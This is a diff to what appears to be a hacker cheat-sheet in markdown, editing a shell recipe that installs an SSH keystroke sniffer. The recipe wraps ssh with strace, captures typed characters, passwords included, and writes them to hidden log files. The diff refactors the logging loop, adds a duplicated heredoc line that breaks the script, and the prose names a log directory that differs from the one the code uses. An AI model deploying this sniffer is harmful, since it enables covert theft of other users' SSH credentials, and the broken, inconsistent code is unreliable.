@@ -698,18 +698,17 @@ strace -e trace=read -o '! ~/.local/bin/ssh-log \$\$' /usr/bin/ssh \$@
 __EOF__
 
 cat <<__EOF__ >~/.local/bin/ssh-log
+cat <<__EOF__ >~/.local/bin/ssh-log
 #! /bin/bash
 grep 'read(4' | cut -f2 -d\\" | while read -r x; do
-        if [ \${#x} -ne 2 ] && [ \${#x} -ne 1 ]; then continue; fi
-        if [ x"\${x}" == "x\\\\n" ] || [ x"\${x}" == "x\\\\r" ]; then
-                echo ""
-        else
-                echo -n "\${x}"
-        fi
-done >\$HOME/.local/logs/ssh-log-"\${1}"-`date +%s`.txt
+        [[ \${#x} -gt 5 ]] && continue 
+        [[ \${x} == +(\\\\n|\\\\r) ]] && { echo ""; continue; }
+        echo -n "\${x}"
+done >\$HOME/.local/logs/ssh-log-"\${1}"-\`date +%s\`.txt
 __EOF__
 
 chmod 755 ~/.local/bin/ssh ~/.local/bin/ssh-log
+
 echo -e "\033[1;32mSUCCESS. Re-login as this user. Log files stored in ~/.local/.logs.
 To uninstall cut & paste this\033[0m:\033[1;36m
   grep -v 0xFD0E ~/.profile >~/.profile-new && mv ~/.profile-new ~/.profile
@@ -718,6 +717,7 @@ To uninstall cut & paste this\033[0m:\033[1;36m
   rm -rf ~/.local/logs/ssh-log*.txt
   rmdir ~/.local/logs &>/dev/null\033[0m"
 ```
+(thanks to Gerald for testing this)
 
 The SSH session will be sniffed and logged to *~/.ssh/logs/* the next time the user logs into his shell and uses SSH.
 
